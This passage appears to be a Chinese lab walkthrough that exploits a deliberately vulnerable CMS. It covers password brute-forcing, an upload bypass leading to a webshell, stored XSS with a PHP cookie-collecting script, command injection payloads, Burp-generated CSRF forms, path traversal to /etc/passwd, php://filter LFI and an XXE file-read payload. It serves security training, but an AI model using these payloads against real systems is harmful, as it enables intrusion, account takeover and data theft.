<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406191847633.png" alt="image-20210406191847633"></p>
<ul>
<li><p>使用bp抓包，将数据包发送到<code>Intruder</code>模块，然后加上参数，选择<code>Pitchfork</code>模式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192132707.png" alt="image-20210406192132707" style="zoom:67%;">
</li>
<li><p>到option页面，不可以多线程</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192222031.png" alt="image-20210406192222031" style="zoom:67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192611191.png" alt="image-20210406192611191" style="zoom:67%;">

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192635613.png" alt="image-20210406192635613"></p>
</li>
<li><p>设置payload1,也就是token值</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192820026.png" alt="image-20210406192820026"></p>
</li>
<li><p>设置payload2 password的值，这里可以选择自己收藏的密码字典，或者直接使用bp自带的。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193125862.png" alt="image-20210406193125862" style="zoom:67%;"></li>
</ul>
<p>爆破结果</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193217954.png" alt="image-20210406193217954" style="zoom: 67%;">

<p>当密码为admin时，可以看到相应包中返回的数据存在一个url，很明显这里是，登录成功后进行的跳转，可以在浏览器中看到，已经登录到了后台页面</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193418062.png" alt="image-20210406193418062" style="zoom:67%;">





<p>结合前面sql注入获取的密码和encrypt，尝试猜测密码的保存方式</p>
<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-string">&#x27;adminWo0bAa&#x27;</span>)</span></span> = <span class="hljs-number">9724</span>b5e6c56b95f5723009ef81961bfe</code></pre>

<p>所以密码保存的是密码和加密因子拼接后的md5值。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323150840468.png" alt="image-20210323150840468" style="zoom:67%;">

<h2 id="7-文件上传（3个）"><a href="#7-文件上传（3个）" class="headerlink" title="7.文件上传（3个）"></a>7.文件上传（3个）</h2><h3 id="漏洞点一-1"><a href="#漏洞点一-1" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户登录后可以看到一个图片征集页面<code>http://192.168.164.147/member/index/photo</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220533116.png" alt="image-20210420220533116"></p>
<p>随便上传一个图片文件后，可以看到返回了图片的保存地址</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220615042.png" alt="image-20210420220615042"></p>
<p>但是当上传一个非图片类型时，会提示只允许上传<code>.jpg|.png|.gif</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220733976.png" alt="image-20210420220733976"></p>
<p>这只是前端检测，抓包就可以解决</p>
<p>抓包上传一个php为后缀的文件，并将MIME改为<code>image/jpeg</code>,可以看到php后缀被换成空了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220956393.png" alt="image-20210420220956393"></p>
<p>尝试双写绕过，可以看到文件已经正常上传</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221049529.png" alt="image-20210420221049529"></p>
<p>访问可以看到phpinfo<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221137498.png" alt="image-20210420221137498" style="zoom:50%;"></p>
<p>下面就是上传一句话木马，控制服务器</p>
<h3 id="漏洞点二-1"><a href="#漏洞点二-1" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后可以在内容管理—&gt;在线投稿的位置投稿，这里用户可以上传稿件中需要用到图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406154414604.png" alt="image-20210406154414604" style="zoom: 50%;">

<p>但是攻击者可能会上传一些刻意文件，比如一句话木马，来攻击服务器，下面我们上传一个php文件获取<code>phpinfo</code></p>
<p>首先选择一张空的照片，然后将其改为php文件，内容为<code>&lt;? phpinfo(); ?&gt;</code>，可以看到上传成功的url</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160155045.png" alt="image-20210406160155045"></p>
<p>访问服务器返回的url，已经看到该网站的phpinfo信息，也就是确定了该上传目录拥有可执行权限，下一步就是上传一句话木马进一步控制该服务器。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160256835.png" alt="image-20210406160256835"></p>
<p>上传一句话木马</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160534542.png" alt="image-20210406160534542"></p>
<p>使用蚁剑连接即可。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322205328527.png" alt="image-20210322205328527"></p>
<h3 id="漏洞点三-1"><a href="#漏洞点三-1" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>在上一步中我们已经知道了admin的账号密码，然后登录。再用自己注册的账号向某个栏目投稿，之后管理员再审核，便会出现一个类似于用户投稿的页面，然后就可以像上一个漏洞一样上传一句话木马文件。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161255195.png" alt="image-20210406161255195"></p>
<h2 id="8-XSS（2个）"><a href="#8-XSS（2个）" class="headerlink" title="8.XSS（2个）"></a>8.XSS（2个）</h2><h3 id="漏洞点一-2"><a href="#漏洞点一-2" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>登录管理员账号后可以发送短消息给用户</p>
<p>在之前的sql注入漏洞里，我们可以获取<code>yzn_member</code>表中的所有信息，虽然可以获取密码，但是因为是md5值，并且是加盐后的md5值，破解的难度很高，所以可以使用获取cookie的方式攻击。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212238672.png" alt="image-20210322212238672" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212821313.png" alt="image-20210322212821313" style="zoom: 67%;"></p>
<p>从中可以看到用户登录的时间，从而可以判断该用户是否在线，我们选择那些在线的用户，获取其浏览器的cookie，这样就可以做到密码登录其账号。</p>
<p>尝试向用户<code>szy</code>发送带有恶意脚本的短消息，内容如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151141271.png" alt="image-20210323151141271"></p>
<p>发送完后，浏览器弹出<code>xss</code>，并且每次刷新都会出现弹窗，说明是存储型XSS。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151240397.png" alt="image-20210323151240397"></p>
<p>当用户点开收件箱时，浏览器也会出现弹窗，说明漏洞利用成</p>
<p>&#x3D;&#x3D;尝试获取用户cookie(失败)&#x3D;&#x3D;</p>
<p>首先在服务器上写一个获取cookie的脚本，内容如下，就是获取cookie参数，然后将其写入cookie.txt中，并记录写入的时间。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];
<span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getenv</span> (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);
<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);
<span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);
<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>然后向用户发送带有恶意脚本的消息，<code>192.168.164.1</code>为服务器的ip地址，这里就使用了自己的本机地址，而在现实的渗透测试中是需要选择能够与公网通信的服务器或者vps。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153154260.png" alt="image-20210323153154260" style="zoom:67%;">

<p>当用户点开收件箱后，这个脚本就会自动执行，就可以将cookie写入到服务器上的cookie.txt。</p>
<p>查看cookie.txt 获取的cookie</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153009193.png" alt="image-20210323153009193"></p>
<p>但是可以发现这里的cookie好像并不完整，看了一下原来是PHPsession值那里设置了http-only，而http-only就是防止通过js脚本读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408154117932.png" alt="image-20210408154117932" style="zoom:67%;">

<h3 id="漏洞点二-2"><a href="#漏洞点二-2" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>登录后的用户可以在留言板进行留言，留言后会显示近期的留言信息</p>
<p>url <a href="http://192.168.164.147/member/index/comment.html">http://192.168.164.147/member/index/comment.html</a></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223132548.png" alt="image-20210419223132548"></p>
<p>在留言中插入恶意脚本，此时数据会被提交到服务器处理，并写入数据库，显示近期的留言，此时恶意脚本被执行，造成了XSS漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223319706.png" alt="image-20210419223319706"></p>
<p>可以看大恶意脚本被浏览器执行，嵌入到html页面中</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223406331.png" alt="image-20210419223406331" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223500074.png" alt="image-20210419223500074" style="zoom:67%;"></p>
<h2 id="9-RCE（2个）"><a href="#9-RCE（2个）" class="headerlink" title="9.RCE（2个）"></a>9.RCE（2个）</h2><h3 id="漏洞点一-3"><a href="#漏洞点一-3" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>后台管理中存在一个采集模块，其中存在于一个“phpinfo”，点击即可查看到phpinfo信息</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165611927.png" alt="image-20210413165611927"></p>
<p>这里看似没有提交参数位置，让人觉得无从下手，在前端查看源码即可发现，是将输入框隐藏了，才无法看见，输入的内容。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170143896.png" alt="image-20210413170143896"></p>
<p>抓包就可以发现端倪，可以看到这里存在一个post方式提交了一个data参数</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165919019.png" alt="image-20210413165919019"></p>
<p>提交的内容为</p>
<pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=phpinfo()</span></code></pre>

<p>然后就返回了php的各项信息，应该是执行了phpinfo这个函数，那么可能就是用到了eval()函数，尝试输入</p>
<pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=system(&#x27;<span class="hljs-title">ls</span> /&#x27;)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170755721.png" alt="image-20210413170755721" style="zoom:67%;">

<p>利用成功。</p>
<h3 id="漏洞点二-3"><a href="#漏洞点二-3" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中存在一个采集模块，其中存在于一个“查看内网主机”，可以查看内网中的主机是否在线。查看一个主机是否在线最常用的方法就是使用<code>ping</code>命令，还要结合php中的<code>shell_exec()</code>函数。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323155906491.png" alt="image-20210323155906491"></p>
<p>尝试使用管道符拼接命令，造成命令执行。</p>
<p>payload:</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | ls /</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413171011227.png" alt="image-20210413171011227"></p>
<p>可以看到列出了根目录的文件夹，说明命令执行成功。</p>
<h2 id="10-CSRF（4个）"><a href="#10-CSRF（4个）" class="headerlink" title="10.CSRF（4个）"></a>10.CSRF（4个）</h2><h3 id="漏洞点一-4"><a href="#漏洞点一-4" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户主页面–&gt;积分赠送</p>
<p>输入用户名和要赠送积分的数量即可赠送自己的积分</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423171711582.png" alt="image-20210423171711582" style="zoom:50%;">

<p>当我们通过查找用户邮箱功能获取到某个用户的邮箱时，就可以构造出一个类似于下图的网页，生成链接后通过邮箱发给受害者然后诱使其点击链接，就能神不知鬼不觉的将其积分转到自己的账号下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423170700922.png" alt="image-20210423170700922" style="zoom:50%;">





<h3 id="漏洞点二-4"><a href="#漏洞点二-4" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中，存在会员管理模块–&gt;点击编辑，在这里管理员可以改变会员的等级，积分和密码等。然而如果攻击者获取了更改用户等级的表单就可以精心构造出一个网页（burp可以一键生成），这个网页的功能可以将会员修改为攻击者想要的等级，或者是添加管理员。此时如果管理员不小心点击了这个链接，浏览器带着管理员登录时的<code>cookie</code>访问了该链接，那么服务器就认为修改会员等级的操作是管理员本人，执行该操作，从而造成攻击。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153533206.png" alt="image-20210408153533206" style="zoom: 50%;">

<p>使用bp抓取该表单</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162252486.png" alt="image-20210323162252486" style="zoom: 50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=szy&amp;nickname=szy&amp;mobile=<span class="hljs-number">17856276754</span>&amp;email=<span class="hljs-number">263233</span>%<span class="hljs-number">40</span>qq.com&amp;password=&amp;groupid=<span class="hljs-number">2</span>&amp;point=<span class="hljs-number">0</span>&amp;vip=<span class="hljs-number">0</span>&amp;overduedate=<span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>+<span class="hljs-number">08</span>%<span class="hljs-number">3</span>A00%<span class="hljs-number">3</span>A00&amp;id=<span class="hljs-number">1</span></code></pre>

<p>提交的数据中可以修改<code>groupid, point, vip</code></p>
<p>使用bp一键生成攻击网页</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162450984.png" alt="image-20210323162450984"></p>
<p>生成的内容为</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mobile&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17856276754&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;263233<span class="hljs-symbol">&amp;#64;</span>qq<span class="hljs-symbol">&amp;#46;</span>com&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;groupid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;overduedate&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1970<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#32;</span>08<span class="hljs-symbol">&amp;#58;</span>00<span class="hljs-symbol">&amp;#58;</span>00&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>



<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162711313.png" alt="image-20210323162711313" style="zoom:50%;">

<p>复制上面的链接，使用社工的方法发送给admin，如果他在处于登录状态时点击那么攻击就成功了。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161709510.png" alt="image-20210406161709510"></p>
<p>点击<code>Submit request</code>，就会出现更新成功的提示。查看<code>szy</code>，确认其等级变化</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323163057847.png" alt="image-20210323163057847" style="zoom: 50%;">

<p>可以看到该用户的等级已经变成了高级会员，并且积分点数也变成了1000，漏洞利用成功。</p>
<h3 id="漏洞点三-2"><a href="#漏洞点三-2" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>同样是在这个页面，有一个”添加”页面，同样也是存在CSRF漏洞，如果被攻击者利用，则可以创造出大量的无用账号，从而浪费服务器的资源，可能造成dos攻击。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153639002.png" alt="image-20210408153639002" style="zoom: 33%;">



<h3 id="漏洞点四-1"><a href="#漏洞点四-1" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>内容-&gt;稿件管理-&gt;通过审核，这里会显示所有用户提交的稿件，但是如果攻击者提交了一个含有恶意代码的稿件，又想在admin不知情的情况下让这个稿件通过审核，此时就可以创建一个恶意链接发送给admin，</p>
<p>内容如下</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/cms/publish/pass.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ids<span class="hljs-symbol">&amp;#91;</span><span class="hljs-symbol">&amp;#93;</span>&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>

<p>当admin点击后，就会让稿件通过审核</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224904297.png" alt="image-20210419224904297" style="zoom: 33%;">



<h2 id="11-任意文件下载"><a href="#11-任意文件下载" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><p>首页中存在一个图片下载模块，可以下载自己喜欢的球星壁纸</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144023954.png" alt="image-20210428144023954" style="zoom:50%;">

<p>但是我们可以拦截请求，修改提交的数据</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144326701.png" alt="image-20210428144326701"></p>
<p>尝试下载<code>/etc/passwd</code>文件，输入</p>
<pre><code class="hljs abnf"><span class="hljs-attribute">filename</span><span class="hljs-operator">=/</span>etc/passwd</code></pre>

<p>但是出现提示<code>文件不存在！</code></p>
<p>尝试多输入几个<code>../</code></p>
<pre><code class="hljs awk">filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144637060.png" alt="image-20210428144637060" style="zoom:50%;">

<p>成功获取到<code>/etc/passwd</code>文件内容</p>
<p>那么就可以结合RCE漏洞，获取到该服务器上的任意文件</p>
<p>首先利用RCE漏洞获取到文件的完整路径，之后配合该漏洞即可实现任意文件下载。</p>
<h2 id="12-unserialize"><a href="#12-unserialize" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>该漏洞就是一个CTF题目，但是源码需要利用前面的漏洞获取</p>
<p>链接:<a href="http://192.168.164.147/ctf/index">http://192.168.164.147/ctf/index</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164427572.png" alt="image-20210323164427572" style="zoom:67%;">

<p>根据提示是一个ctf题目，那么应该也符合一般ctf中web题目的套路。</p>
<p>首先查看源码 ，获取提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164641331.png" alt="image-20210323164641331"></p>
<p>但是一般的反序列化漏洞的题目都是有源码的，只有根据源码才能写出EXP。</p>
<p>既然没有源码，我们就需要使用之前发现的漏洞获取源码。</p>
<p>有五种获取源码的方法</p>
<ul>
<li><p>文件上传</p>
<p>上传一句话木马后，可以控制服务器，可以直接到网站根目录中下载文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171248434.png" alt="image-20210323171248434"></p>
</li>
<li><p>LFI</p>
<p>使用<code>php://filter</code>，在文件包含漏洞的位置获取base64源码</p>
<p>payload：</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/contact/i</span>ndex?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=unserialize.php</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171514268.png" alt="image-20210323171514268"></p>
</li>
<li><p>XXE</p>
<p>利用文件上传获取的路劲</p>
<p>payload</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///var/www/public/unserialize.php&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>das<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre>
</li>
<li><p>任意文件下载</p>
<p>点击即可下载到文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414195346355.png" alt="image-20210414195346355"></p>
</li>
<li><p>RCE</p>
<p>首先 列出目录</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | ls</code></pre>

<p>读取文件</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | cat unserialize.php</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171610197.png" alt="image-20210323171610197"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171742181.png" alt="image-20210323171742181"></p>
<p>源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
        &#123;
